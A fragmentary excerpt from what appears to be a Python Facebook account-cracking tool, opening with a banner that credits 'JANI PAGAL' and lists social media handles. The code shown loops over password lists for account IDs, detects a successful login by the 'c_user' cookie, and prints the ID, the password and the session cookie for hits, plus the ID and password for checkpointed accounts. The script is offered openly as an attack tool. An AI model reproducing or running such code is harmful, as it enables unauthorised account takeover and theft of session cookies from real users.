...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 MALIK SOHAIL 🔥].  ║

\x1b[0;33m║       #TOOL AUTHOR [JANI PAGAL] PAKISTANI KING. ║
...
\x1b[0;33m║#FACEBOOK : NAME [JANI 906].       ║

\x1b[0;33m║#GITHUB : https://github.com/MRJANI906.   ║
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[JANI-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[JANI-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[JANI-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
